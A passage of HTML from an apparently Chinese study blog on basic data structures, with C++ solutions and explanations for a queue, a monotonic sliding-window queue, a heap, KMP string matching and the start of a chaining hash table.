class="hljs-number">100000</span>,<br><span class="hljs-number">1</span>≤x≤<span class="hljs-number">109</span>,<br>所有操作保证合法。<br><br>输入样例：<br><span class="hljs-number">10</span><br><span class="hljs-built_in">push</span> <span class="hljs-number">6</span><br>empty<br>query<br><span class="hljs-built_in">pop</span><br>empty<br><span class="hljs-built_in">push</span> <span class="hljs-number">3</span><br><span class="hljs-built_in">push</span> <span class="hljs-number">4</span><br><span class="hljs-built_in">pop</span><br>query<br><span class="hljs-built_in">push</span> <span class="hljs-number">6</span><br>输出样例：<br>NO<br><span class="hljs-number">6</span><br>YES<br><span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> queue[N],head,tt=<span class="hljs-number">-1</span>;<span class="hljs-comment">//初始化队列尾把为-1，这样插入的时候头和尾就会一样了</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    queue[++tt]=x;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(head&lt;=tt) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> queue[head];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string operation;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        cin&gt;&gt;operation;<br>        <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&quot;push&quot;</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin&gt;&gt;x;<br>            <span class="hljs-built_in">push</span>(x);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&quot;pop&quot;</span>)<br>        &#123;<br>            <span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&quot;empty&quot;</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">empty</span>()) cout&lt;&lt;<span class="hljs-string">&quot;NO&quot;</span>&lt;&lt;endl;<br>            <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;YES&quot;</span>&lt;&lt;endl;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&quot;query&quot;</span>)<br>        &#123;<br>            cout&lt;&lt;<span class="hljs-built_in">query</span>()&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="单调队列"><a href="#单调队列" class="headerlink" title="单调队列"></a>单调队列</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs subunit">154. 滑动窗口<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>给定一个大小为 n≤106 的数组。<br><br>有一个大小为 k 的滑动窗口，它从数组的最左边移动到最右边。<br><br>你只能在窗口中看到 k 个数字。<br><br>每次滑动窗口向右移动一个位置。<br><br>以下是一个例子：<br><br>该数组为 [1 3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span> 5 3 6 7]，k 为 3。<br><br>窗口位置最小值最大值<br>[1 3 <span class="hljs-string">-1</span>] <span class="hljs-string">-3</span> 5 3 6 7<span class="hljs-string">-1</span>3<br>1 [3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span>] 5 3 6 7<span class="hljs-string">-3</span>3<br>1 3 [<span class="hljs-string">-1</span> <span class="hljs-string">-3</span> 5] 3 6 7<span class="hljs-string">-3</span>5<br>1 3 <span class="hljs-string">-1</span> [<span class="hljs-string">-3</span> 5 3] 6 7<span class="hljs-string">-3</span>5<br>1 3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span> [5 3 6] 736<br>1 3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span> 5 [3 6 7]37<br>你的任务是确定滑动窗口位于每个位置时，窗口中的最大值和最小值。<br><br>输入格式<br>输入包含两行。<br><br>第一行包含两个整数 n 和 k，分别代表数组长度和滑动窗口的长度。<br><br>第二行有 n 个整数，代表数组的具体数值。<br><br>同行数据之间用空格隔开。<br><br>输出格式<br>输出包含两个。<br><br>第一行输出，从左至右，每个位置滑动窗口中的最小值。<br><br>第二行输出，从左至右，每个位置滑动窗口中的最大值。<br><br>输入样例：<br>8 3<br>1 3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span> 5 3 6 7<br>输出样例：<br><span class="hljs-string">-1</span> <span class="hljs-string">-3</span> <span class="hljs-string">-3</span> <span class="hljs-string">-3</span> 3 3<br>3 3 5 5 6 7<br></code></pre></td></tr></table></figure><p>思路：</p><p>最小值和最大值分开来做，两个for循环完全类似，都做以下四步：</p><ol><li>解决队首已经出窗口的问题;</li><li>解决队尾与当前元素a[i]不满足单调性的问题;</li><li>将当前元素下标加入队尾;</li><li>如果满足条件则输出结果;</li></ol><p>需要注意的细节：</p><ol><li>上面四个步骤中一定要先3后4，因为有可能输出的正是新加入的那个元素</li><li>队列中存的是原数组的下标，取值时要再套一层，a[q[]];</li><li>算最大值前注意将hh和tt重置;</li><li>此题用cout会超时，只能用printf;</li><li>hh从0开始，数组下标也要从0开始。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e6</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> hh,tt=<span class="hljs-number">-1</span>,a[N],q[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,k;<br>    cin&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(hh&lt;=tt&amp;&amp;k&lt;i-q[hh]+<span class="hljs-number">1</span>)  hh++;<span class="hljs-comment">//维护窗口长度</span><br>        <span class="hljs-keyword">while</span>(hh&lt;=tt&amp;&amp;a[q[tt]]&gt;=a[i]) tt--; <span class="hljs-comment">//使队列单调</span><br>        q[++tt]=i;<span class="hljs-comment">//传入最后一个满足的值</span><br>        <span class="hljs-keyword">if</span>(i&gt;=k<span class="hljs-number">-1</span>) cout&lt;&lt;a[q[hh]]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout&lt;&lt;endl;<br>    hh=<span class="hljs-number">0</span>,tt=<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(hh&lt;=tt&amp;&amp;k&lt;i-q[hh]+<span class="hljs-number">1</span>) hh++;<br>        <span class="hljs-keyword">while</span>(hh&lt;=tt&amp;&amp;a[q[tt]]&lt;=a[i]) tt--;<br>        q[++tt]=i;<br>        <span class="hljs-keyword">if</span>(i&gt;=k<span class="hljs-number">-1</span>) cout&lt;&lt;a[q[hh]]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> h[N],hp[N],ph[N],cur_size,m;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heap_swap</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">swap</span>(ph[hp[a]],ph[hp[b]]);<br>    <span class="hljs-built_in">swap</span>(hp[a],hp[b]);<br>    <span class="hljs-built_in">swap</span>(h[a],h[b]);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">up</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span>(x/<span class="hljs-number">2</span>&amp;&amp;h[x/<span class="hljs-number">2</span>]&gt;h[x])<br>    &#123;<br>       <span class="hljs-built_in">heap_swap</span>(x,x/<span class="hljs-number">2</span>);<br>        x&gt;&gt;=<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t=x;<br>    <span class="hljs-keyword">if</span>(x*<span class="hljs-number">2</span>&lt;=cur_size&amp;&amp;h[<span class="hljs-number">2</span>*x]&lt;h[t]) t=<span class="hljs-number">2</span>*x;<br>    <span class="hljs-keyword">if</span>(x*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>&lt;=cur_size&amp;&amp;h[<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>]&lt;h[t]) t=<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(x!=t)<br>    &#123;<br>        <span class="hljs-built_in">heap_swap</span>(t,x);<br>        <span class="hljs-built_in">down</span>(t);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        string op;<br>        cin&gt;&gt;op;<br>        <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;I&quot;</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin&gt;&gt;x;<br>            cur_size++;<br>            m++;<br>            ph[m]=cur_size,hp[cur_size]=m;<br>            h[cur_size]=x;<br>            <span class="hljs-built_in">up</span>(cur_size);<span class="hljs-comment">//最后插入，需要up</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;PM&quot;</span>) cout&lt;&lt;h[<span class="hljs-number">1</span>]&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;DM&quot;</span>)<br>        &#123;<br>            <span class="hljs-built_in">heap_swap</span>(<span class="hljs-number">1</span>,cur_size);<br>            cur_size--;<br>            <span class="hljs-built_in">down</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;D&quot;</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin&gt;&gt;x;<br>            <span class="hljs-type">int</span> k=ph[x];<span class="hljs-comment">//找到第k个插入的数在堆中的位置，因为删除k后，我们就丢失额了原先第k个数的位置</span><br>            <span class="hljs-built_in">heap_swap</span>(ph[x],cur_size);<br>            cur_size--;<br>            <span class="hljs-built_in">down</span>(k);<br>            <span class="hljs-built_in">up</span>(k);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-type">int</span> k,x;<br>            cin&gt;&gt;k&gt;&gt;x;<br>            h[ph[k]]=x;<br>            <span class="hljs-built_in">down</span>(ph[k]);<br>            <span class="hljs-built_in">up</span>(ph[k]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//注意代码要放在两组三个点之间，才可以正确显示代码高亮哦~</span><br></code></pre></td></tr></table></figure><h1 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h1><p>KMP全称为Knuth Morris Pratt算法，三个单词分别是三个作者的名字。KMP是一种高效的字符串匹配算法，用来在主字符串中查找模式字符串的位置(比如在“hello,world”主串中查找“world”模式串的位置)。</p><h2 id="KMP算法的高效体现在哪"><a href="#KMP算法的高效体现在哪" class="headerlink" title="KMP算法的高效体现在哪"></a>KMP算法的高效体现在哪</h2><p>高效性是通过和其他字符串搜索算法对比得到的，在这里拿BF(Brute Force)算法做一下对比。BF算法是一种最朴素的暴力搜索算法。它的思想是在主串的[0, n-m]区间内依次截取长度为m的子串，看子串是否和模式串一样(n是主串的长度，m是子串的长度)。<br>BF的时间复杂度是O(N*N)，存在很大优化空间。当模式串和主串匹配时，遇到模式串中某个字符不能匹配的情况，对于模式串中已经匹配过的那些字符，如果我们能找到一些规律，将模式串多往后移动几位，而不是像BF算法一样，每次把模式串移动一位，就可以提高算法的效率。比如说在“ababaababacd”中查找“ababac”，可以避免一些字符之间的比较。</p><p>下面通过一个具体的例子来看看可以跳过的情况。比如主模式串是”ababaeaba”,模式串是”ababacd”,在BF算法中，遇到不匹配的情况是这样处理的:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">main:</span>    <span class="hljs-string">&quot;ababaeaba&quot;</span> // 例如这两个串，当<span class="hljs-keyword">sub</span>为<span class="hljs-string">&quot;ababaea&quot;</span>时和<span class="hljs-string">&quot;ababacd&quot;</span>进行对<br><span class="hljs-symbol">pattern:</span> <span class="hljs-string">&quot;ababacd&quot;</span>   // 比，当main[i]为e时，发现和pattern[j]的值e不一致，BF<br>                                         // 的做法是去下一个<span class="hljs-keyword">sub</span>,即用<span class="hljs-string">&quot;babaeab&quot;</span>和pattern进行比较。<br></code></pre></td></tr></table></figure><p>我没希望找到一些规律，遇到两个字符不匹配的情况时，希望可以多跳几个字符，减少比较次数。KMP算法的思想是：在模式串和主串匹配过程中，当遇到不匹配的字符时，对于主串和模式串中已对比过相同的前缀字符串，找到长度最长的相等前缀串，从而将模式串一次性滑动多位，并省略一些比较过程。在上个例子，KMP算法中，是这样处理的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">main:    <span class="hljs-string">&quot;ababaeaba&quot;</span> <span class="hljs-regexp">//</span> 比如main中的<span class="hljs-string">&quot;ababa&quot;</span>子串，对标为[<span class="hljs-number">2</span>~<span class="hljs-number">4</span>]的<span class="hljs-string">&quot;aba&quot;</span>和pattern中下<br>pattern: <span class="hljs-string">&quot;ababacd&quot;</span>   <span class="hljs-regexp">//</span> 标为[<span class="hljs-number">0</span>~<span class="hljs-number">2</span>]的<span class="hljs-string">&quot;aba&quot;</span>相同,此时可以滑动j-k位,即j=j-k。(其中j是<br>                                         <span class="hljs-regexp">//</span> pattern中<span class="hljs-string">&quot;c&quot;</span>的下标,k是<span class="hljs-string">&quot;abc&quot;</span>的长度)。<br>            <span class="hljs-string">&quot;ababaeaba&quot;</span>      <span class="hljs-regexp">//</span> 比较过程中，main[<span class="hljs-number">5</span>]为<span class="hljs-string">&quot;e&quot;</span>和pattern[<span class="hljs-number">5</span>]为<span class="hljs-string">&quot;c&quot;</span>不匹配，但是两个<br>            <span class="hljs-string">&quot;ababacd&quot;</span>            <span class="hljs-regexp">//</span> 串中都有相同的<span class="hljs-string">&quot;aba&quot;</span>前缀,所以可以滑动j-k位<br>                    |           <br>                    ∨<br>            <span class="hljs-string">&quot;ababaeaba&quot;</span>   <br>                <span class="hljs-string">&quot;ababacd&quot;</span><br>                    |               <span class="hljs-regexp">//</span> 滑动j-k位后发现main[<span class="hljs-number">5</span>]和patterb[<span class="hljs-number">3</span>]不相同，需要再次滑动<br>                    ∨<br>            <span class="hljs-string">&quot;ababaeaba&quot;</span>   <br>                    <span class="hljs-string">&quot;ababacd&quot;</span> <span class="hljs-regexp">//</span> 滑动过程和上次类似。<br></code></pre></td></tr></table></figure><p>通过这个例子可以看出，每次滑动的位数是j-k，滑动位数和主串无关，仅通过模式串就可以求出。在KMP算法中通过next数组来存储当两个字符不相等时模式串应该移动的位数。</p><p>如何KMP算法的next数组<br>再次明确next数组的含义 : next数组用来存模式串中每个前缀最长的能匹配前缀子串的结尾字符的下标。 next[i] &#x3D; j 表示下标以i-j为起点，i为终点的后缀和下标以0为起点，j为终点的前缀相等，且此字符串的长度最长。用符号表示为p[0<del>j] &#x3D;&#x3D; p[i-j</del>i]。下面以”ababacd”模式串为例，给出这个串的next数组。</p><table><thead><tr><th>模式前缀</th><th>前缀结尾下标</th><th>最长能匹配前缀子串结尾字符的下标</th><th>next数组的取值</th><th>匹配情况</th></tr></thead><tbody><tr><td>a</td><td>0</td><td>-1</td><td>next[0] &#x3D; -1</td><td>无</td></tr><tr><td>ab</td><td>1</td><td>-1</td><td>next[1] &#x3D; -1</td><td>无</td></tr><tr><td>aba</td><td>2</td><td>0</td><td>next[2]&#x3D;0</td><td>pattern[2]&#x3D;&#x3D;pattern[0]</td></tr><tr><td>abab</td><td>3</td><td>1</td><td>next[3]&#x3D;1</td><td>pattern[2:4]&#x3D;&#x3D;pattern[0:2]</td></tr><tr><td>ababa</td><td>4</td><td>2</td><td>next[4]&#x3D;2</td><td>pattern[2:5]&#x3D;&#x3D;pattern[0:3]</td></tr><tr><td>ababac</td><td>5</td><td>-1</td><td>next[5]&#x3D;-1</td><td>无</td></tr></tbody></table><p>KMP的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>,M=<span class="hljs-number">1000010</span>;<br><span class="hljs-type">int</span> n,m,ne[N];<br><span class="hljs-type">char</span> p[N],s[M];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;p+<span class="hljs-number">1</span>&gt;&gt;m&gt;&gt;s+<span class="hljs-number">1</span>;<span class="hljs-comment">//kmp算法通常都是以下标为1开始</span><br><br>    <span class="hljs-comment">//j从下标零开始,是因为我们要判断的是p[j+1]是否等于p[i]，如果是p[j]与p[i]比较，那么当</span><br>    <span class="hljs-comment">//p[j]与p[i]不匹配的时候,就找不到最长的前后缀匹配和了</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>,j=<span class="hljs-number">0</span>;i&lt;=n;i++)<span class="hljs-comment">//因为p的第一个ne[1]=0的，所以从第二个开始</span><br>    &#123;<br>        <span class="hljs-keyword">while</span>(j&amp;&amp;p[i]!=p[j+<span class="hljs-number">1</span>]) j=ne[j];<br>        <span class="hljs-keyword">if</span>(p[i]==p[j+<span class="hljs-number">1</span>]) j++;<br>        ne[i]=j;<br>    &#125;<br><br>    <span class="hljs-comment">//kmp匹配</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>,j=<span class="hljs-number">0</span>;i&lt;=m;i++)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(j&amp;&amp;s[i]!=p[j+<span class="hljs-number">1</span>]) j=ne[j];<br>        <span class="hljs-keyword">if</span>(s[i]==p[j+<span class="hljs-number">1</span>]) j++;<br>        <span class="hljs-keyword">if</span>(j==n)<br>        &#123;<br>            cout&lt;&lt;i-n&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Trie"><a href="#Trie" class="headerlink" title="Trie"></a>Trie</h1><h1 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h1><h2 id="拉链法"><a href="#拉链法" class="headerlink" title="拉链法"></a>拉链法</h2><p><img src="https://cdn.acwing.com/media/article/image/2021/01/17/2675_9b33804c58-4.jpg" alt="https://cdn.acwing.com/media/article/image/2021/01/17/2675_9b33804c58-4.jpg"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> h[N],ne[N],e[N],idx,n;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span 